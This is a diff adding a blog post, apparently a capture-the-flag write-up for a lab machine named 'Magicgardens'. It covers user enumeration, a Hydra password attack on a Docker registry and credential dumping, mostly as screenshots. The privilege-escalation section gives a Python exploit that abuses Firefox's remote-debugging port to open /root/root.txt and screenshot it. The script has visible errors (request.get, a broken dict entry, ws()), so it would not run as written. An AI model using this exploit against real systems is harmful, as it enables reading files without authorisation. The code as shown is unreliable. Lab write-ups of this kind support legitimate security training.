@@ -1,0 +1,228 @@
+---
+layout: post
+title: "Magicgardens 0eff0627d5364a36aa38d148d2256c53"
+date:   2025-07-11 12:05:57 -0400
+categories: writeups
+---
+
+# Magicgardens
+
+# 1. Enumeration
+
+We started with port enumeration with nmap
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled.png' | relative_url }})
+
+We’ve found the domain name associted, and we realized there’s a flower ecommerce, alse there are other ports like 25 or 5000 which we can explore later  
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_1.png' | relative_url }})
+
+We proceed to sign up 
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_2.png' | relative_url }})
+
+There is something interesting right here, is we create 2 users we will be able to discover a pattern in server response, to find that pattern we will focus on Username and Email input. We are able to enumerate all web application users as follow:
+
+| Username | Email | Server response |
+| --- | --- | --- |
+| Valid username | Valid email | 200 |
+| valid username | Invalid email | 200 |
+| Invalid username | valid email | 500 |
+| Invalid username | Invalid email | 200 |
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_3.png' | relative_url }})
+
+To automate the enumeration we will compare different usernames with a valid email
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_4.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_5.png' | relative_url }})
+
+# 2. User flag
+
+Unfortunately we didn’t find any username so we continue user enumeration, we found some directories
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_6.png' | relative_url }})
+
+A login page could be useful
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_7.png' | relative_url }})
+
+We haven’t forget other ports, we have mailing server running, we can enumerate user’s here due to the valid commands shown in nmap scan, 
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_8.png' | relative_url }})
+
+Depending of the size of the dictionary it could take so much time
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_9.png' | relative_url }})
+
+we already have a user
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_10.png' | relative_url }})
+
+Let’s enumerate web application service running on port 5000
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_11.png' | relative_url }})
+
+There are some a authentication directoty we may use the username found before
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_12.png' | relative_url }})
+
+As we known on port 5000 there is a docker https server
+
+Hydra
+
+Hydra can perform fast fictionary attacks againts mora than 50 protocolos, including `telnet -FTP - HTTP - HTTPS - SMB`   
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_13.png' | relative_url }})
+
+A valid password was found, and we can see there’s a some repositories there
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_14.png' | relative_url }})
+
+[DockerRegistryGrabber](https://github.com/Syzik/DockerRegistryGrabber) is a Python tool for enumerating/dumping Docker repositories without or with basic authentication.
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_15.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_16.png' | relative_url }})
+
+Environment variables? that’s useful, but first check sqlite database
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_17.png' | relative_url }})
+
+Morty credentials!!
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_18.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_19.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_20.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_21.png' | relative_url }})
+
+# 3.Priv esc
+
+Use linpeas to enumerate the whole system
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_22.png' | relative_url }})
+
+- **firefox-esr** This is the executable for Firefox Entended Support Release, which is stable version of Firefox that is update less frequently.
+- **—marionette** This enables marionette protocol, which is an automation protocol for Firefox. Marionette allows controlling and automating interaction with Firefoz via remote client.
+- **—headless** This option starts Firefox in headless mode, meaning no graphical Firefox windows will be opened.
+- **—remote-debugginport* This specifies the port which Firefox will listen for remote debugging requests. This is used when working with development tools that need to access the firefox instance for debugging or inspecting the loaded web page.
+- **—remote-allow-host** This allow remote connections only from the [localhost](http://localhost) (port forwarding needed)
+- **—no-remote** This option specifies that no additional remote connections will be allowed.
+- **—profile /tmp/profile** This specifies the user profile that Firefox will use when starting.
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_23.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_24.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_25.png' | relative_url }})
+
+With this information we will be able to run Firefox as debugger so with the following expoilt we cloud be able to find any file we want and take and screenshot of the open file
+
+In python
+
+```python
+import json
+import requests 
+import websocket
+import base64
+
+#Debugger address
+debugger_address = 'http://localhost:52735'
+
+#Perform a http request to get open windows on the browser
+response = request.get(f'{debugger_address}/json')
+
+#Analyze JSON answer to obtain information about windows
+tabs = response.json()
+
+#Get the websocket debugger url of the first window and replace 
+#'127.0.0.1' to 'localhost'
+web_socket_debugger_url = tabs[0]['webSocketDebuggerUrl'].replace('127.0.0.1','localhost')
+print(f'Connect to url: {web_socket_debugger_url}')
+
+#Establishing connection 
+ws = websocket.create_connection(web_socket_debugger_url, supress_origin=True)
+
+#Preparing JSON command to create a new  (target) in the browser
+#Pointing a local file
+command = json.dumps({
+	"id": 5,
+	"method": "Target.createTarget",
+	"params":{
+		"url":"file:///root/root.txt"
+	}
+})
+
+#Send the object to create the target
+ws.send(command)
+
+#Receive the answer from websocket and extracts ID of the target
+target_id = json.loads(ws.recv())['result']['targetId']
+print(f'target id": {target_id}')
+
+#Prepare the JSON command to attach the target using its ID
+command = json.dumps({
+	"id":5,
+	"method": "Target.attachToTarget",
+	"params":{
+		"targetId": target_id,
+		"flatten": True
+		
+	}
+})
+
+#Send the command
+ws.send(command)
+
+#Gets the answer and extracts ID session attached
+session_id = json.loads(ws.recv())['params']['sessionId']
+print(f'Session id: {session_id}')
+
+#prepare the command to take a screenshot
+
+command = json.dumps({
+	"id":5,
+	"sessionId" session_id,
+	"method": "Page.captureScreenshot",
+	"params": {
+		"sessionId": session_id,
+		"format":"png"
+	}
+})
+
+#Send the command
+ws.send(command)
+
+#Gets the answer which contains the screenshot in base64
+result = json.loads(ws.recv())
+
+#Send the command again it seems to be neccesary
+ws.send(command)
+#Loads the screenshot
+result = json.loads(ws())
+
+#Verify if the screenshot was successfull
+if 'result' in result and 'data' in result['result']:
+	print("Success file reading")
+	#If it is succesfull decode and save the file
+	with open("root.png", "wb") as file:
+		file.write(base64.b64decode(result['result']['data']))
+else: 
+	print("Error")
+	
+ws.close()
+```
+
+In bash
+
+```bash
+
+```
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_26.png' | relative_url }})
+
+![Untitled]({{ '/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_27.png' | relative_url }})
